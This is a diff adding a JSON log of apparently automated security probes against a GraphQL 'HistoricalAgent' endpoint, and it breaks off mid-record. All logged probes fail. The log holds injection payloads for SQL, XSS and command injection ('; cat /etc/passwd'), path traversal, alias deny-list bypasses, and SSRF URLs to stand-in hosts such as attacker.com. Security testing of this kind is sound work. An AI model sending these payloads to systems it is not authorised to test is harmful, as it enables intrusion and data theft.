@@ -1,0 +1,3531 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T07:44:47.489376Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123' OR '1'='1\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:44:49.358671Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<script>alert('XSS')</script>\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.096,
+    "timestamp": "2025-09-29T07:44:52.362553Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"http://attacker.com/evil.php\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.118,
+    "timestamp": "2025-09-29T07:44:54.597608Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123; cat /etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T07:44:56.679305Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"../../../etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T07:44:58.294075Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<b>bold text</b>\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.093,
+    "timestamp": "2025-09-29T07:44:59.929196Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-456\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.128,
+        "timestamp": "2025-09-29T07:45:01.793424Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.128,
+        "timestamp": "2025-09-29T07:45:01.921014Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-09-29T07:45:01.921053Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.097,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery QueryDenyBypassAliased {\n  s: HistoricalAgent(id: \"agent-456\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.098,
+        "timestamp": "2025-09-29T07:45:05.057521Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.101,
+        "timestamp": "2025-09-29T07:45:05.158752Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-09-29T07:45:05.158801Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.117,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.106,
+    "timestamp": "2025-09-29T07:45:08.124614Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    id\n    typo\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T07:45:10.277628Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/typo]) : Field 'typo' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    type\n    identifier\n    description {\n      name\n      languageCode\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.091,
+    "timestamp": "2025-09-29T07:45:29.262807Z",
+    "count": 12,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123' OR '1'='1\") {\n    id\n    type\n    description {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T07:45:31.463893Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    description {\n      biographicalHistory # Assumed renderable field\n      name\n      source\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T07:45:33.929315Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    links { # Links might contain URLs subject to SSRF\n      id\n      type\n      description\n      linkType\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.093,
+    "timestamp": "2025-09-29T07:45:36.974585Z",
+    "count": 15,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    annotations { # Assuming 'body' or 'by' might be processed by a backend command\n      id\n      type\n      body\n      by\n    }\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:45:39.910283Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    description {\n      source # A field like \"source\" might be used to construct a path\n    }\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:45:41.842711Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    description {\n      biographicalHistory # Assumed renderable field\n      legalStatus\n    }\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.096,
+    "timestamp": "2025-09-29T07:45:43.985364Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-456\") {\n    id\n    type\n    description {\n      name\n      languageCode\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.082,
+        "timestamp": "2025-09-29T07:45:45.752803Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.095,
+        "timestamp": "2025-09-29T07:45:45.847744Z",
+        "response_body": {
+          "data": {
+            "agent": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-09-29T07:45:45.847787Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.087,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery HistoricalAgentAliased {\n  agent: HistoricalAgent(id: \"agent-456\") {\n    id\n    type\n    description {\n      name\n      languageCode\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.095,
+        "timestamp": "2025-09-29T07:45:48.044330Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.082,
+        "timestamp": "2025-09-29T07:45:48.126960Z",
+        "response_body": {
+          "data": {
+            "agent": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-09-29T07:45:48.127003Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.094,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.096,
+    "timestamp": "2025-09-29T07:45:50.599914Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    id\n    type\n    identifier\n    description {\n      nam\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:45:53.526147Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/description/nam]) : Field 'nam' in type 'HistoricalAgentDescription' is undefined",
+          "locations": [
+            {
+              "line": 8,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.095,
+    "timestamp": "2025-09-29T07:46:13.529168Z",
+    "count": 23,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123' OR '1'='1\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.1,
+    "timestamp": "2025-09-29T07:46:15.786818Z",
+    "count": 24,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<script>alert('XSS')</script>\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.078,
+    "timestamp": "2025-09-29T07:46:17.399659Z",
+    "count": 25,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"http://malicious.com/data\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.102,
+    "timestamp": "2025-09-29T07:46:19.167303Z",
+    "count": 26,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123; cat /etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.097,
+    "timestamp": "2025-09-29T07:46:22.163413Z",
+    "count": 27,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"../../../etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T07:46:24.898285Z",
+    "count": 28,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<h1>Hello HTML</h1>\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T07:46:26.707965Z",
+    "count": 29,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-456\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.092,
+        "timestamp": "2025-09-29T07:46:29.779625Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.086,
+        "timestamp": "2025-09-29T07:46:29.866099Z",
+        "response_body": {
+          "data": {
+            "agentAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 30,
+    "timestamp": "2025-09-29T07:46:29.866126Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.086,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery bypassQuery {\n  agentAlias: HistoricalAgent(id: \"agent-456\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.091,
+        "timestamp": "2025-09-29T07:46:31.796741Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.085,
+        "timestamp": "2025-09-29T07:46:31.882442Z",
+        "response_body": {
+          "data": {
+            "agentAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 31,
+    "timestamp": "2025-09-29T07:46:31.882499Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.095,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.083,
+    "timestamp": "2025-09-29T07:46:33.940945Z",
+    "count": 32,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    ids\n    typ\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.092,
+    "timestamp": "2025-09-29T07:46:36.694437Z",
+    "count": 33,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/ids]) : Field 'ids' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/typ]) : Field 'typ' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    type\n    identifier\n    description {\n      name\n      languageCode\n      dates {\n        startDate\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.083,
+    "timestamp": "2025-09-29T07:46:55.336960Z",
+    "count": 34,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123' OR 1=1 --\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.082,
+    "timestamp": "2025-09-29T07:46:57.383732Z",
+    "count": 35,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    description {\n      biographicalHistory\n      name\n      accessPoints {\n        name\n      }\n    }\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.086,
+    "timestamp": "2025-09-29T07:46:59.159035Z",
+    "count": 36,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123-http://localhost:8080/admin\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.147,
+    "timestamp": "2025-09-29T07:47:01.865764Z",
+    "count": 37,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123; cat /etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T07:47:04.008044Z",
+    "count": 38,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    description {\n      name\n      source\n      accessPoints {\n        id\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.1,
+    "timestamp": "2025-09-29T07:47:06.237727Z",
+    "count": 39,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    description {\n      name\n      biographicalHistory\n    }\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T07:47:09.064593Z",
+    "count": 40,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-456\") {\n    id\n    type\n    description {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.093,
+        "timestamp": "2025-09-29T07:47:12.083154Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.084,
+        "timestamp": "2025-09-29T07:47:12.167386Z",
+        "response_body": {
+          "data": {
+            "agentAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 41,
+    "timestamp": "2025-09-29T07:47:12.167433Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.087,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  agentAlias: HistoricalAgent(id: \"agent-456\") {\n    id\n    type\n    description {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.092,
+        "timestamp": "2025-09-29T07:47:14.083606Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.088,
+        "timestamp": "2025-09-29T07:47:14.171808Z",
+        "response_body": {
+          "data": {
+            "agentAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 42,
+    "timestamp": "2025-09-29T07:47:14.171858Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.09,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
